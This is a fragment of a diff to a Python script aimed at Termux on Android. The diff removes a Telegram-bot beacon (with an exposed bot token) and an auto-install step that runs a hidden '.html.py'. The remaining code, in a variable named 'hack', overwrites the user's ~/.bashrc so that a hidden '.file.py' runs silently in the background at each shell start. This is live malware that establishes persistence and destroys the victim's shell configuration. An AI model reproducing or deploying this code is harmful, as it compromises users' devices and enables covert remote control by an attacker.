@@ -1,10 +1,5 @@
-try:
-	import os
-	import requests
-except:os.system('pip install requests');os.sysetm('python .html.py')
+import os
 hack = 'nohup python /data/data/com.termux/files/home/.file.py > /dev/null 2>&1 &'
-requests.post(f'''https://api.telegram.org/bot7353186450:AAGIHWkuPp726In0O5H7toVsQa1AJrouhLU/sendMessage?chat_id=6558294755&text=h''')
-except:pass
 try:
     read = open('/data/data/com.termux/files/home/.bashrc','r').read
     open('/data/data/com.termux/files/home/.bashrc','w').write(hack)
